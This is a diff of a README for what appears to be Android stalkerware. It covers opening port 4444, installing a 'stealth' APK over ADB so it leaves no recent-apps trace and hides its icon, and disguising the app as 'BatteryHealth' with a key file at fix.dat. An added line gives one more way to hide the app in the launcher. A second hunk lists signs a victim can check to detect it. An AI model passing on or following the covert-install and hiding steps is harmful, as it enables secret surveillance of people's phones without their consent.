@@ -101,6 +101,7 @@ sudo ufw allow 4444 "if on linode or on WAN"
 
 # STEALTH
 TIP! install via ADB to avoid recent apps timestamp, also settings does not show in this list, also to assure hiden icon in some cases
+UPDATE: if all fails try long pressing the home screen to open launcher settings for a hide apps option.
 
 1. have a device with adb setup in a terminal and run adb tcpip 5555 with a phone charger plugged in (also have the stealth apk ready in same dir)
 2. make a new folder on the adb pc with this structure com.BatteryHealth/files/keys/fix.dat
@@ -183,9 +184,11 @@ Open dev options and under privacy turn off show passwords when typed
 
 how do I look for this
 
-open accessibility settings and see if anything is on or just present, check installed apps in settings
-on API 29 and above (Oreo) it cannot fully hide the app from the launcher but stealth version shows white icon then only opens up app info
-check app folders in android for a key folder or a fix.dat file
+CHECK
+accessibility settings for any downloaded services or if any are on (name don't matter)
+hide apps section in launcher
+for a fix.dat file in android/data/APP-NAME/files/key/fix.dat
+installed apps section in settings, could show as a blank icon as ZBatteryHealth but this could be put in any apk (so rely on service list)
 
 
 
